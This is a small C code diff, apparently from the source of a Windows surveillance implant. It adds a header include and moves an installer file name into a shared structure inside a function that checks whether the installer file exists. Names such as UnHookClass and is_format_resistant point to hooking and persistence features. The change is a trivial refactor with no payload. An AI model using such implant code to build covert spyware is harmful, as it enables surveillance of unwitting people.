@@ -2,6 +2,7 @@
 #include "common.h"
 #include "H4-DLL.h"
 #include "UnHookClass.h"
+#include "bss.h"
 
 BOOL is_format_resistant = FALSE;
 
@@ -11,7 +12,7 @@ BOOL IsFiles()
 	char obj_string[MAX_PATH];
 
 	// Verifica che esista il file dell'installer
-	HM_CompletePath(EXE_INSTALLER_NAME, obj_string);
+	HM_CompletePath(shared.EXE_INSTALLER_NAME, obj_string);
 	hFile = CreateFile(obj_string, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 		return FALSE;
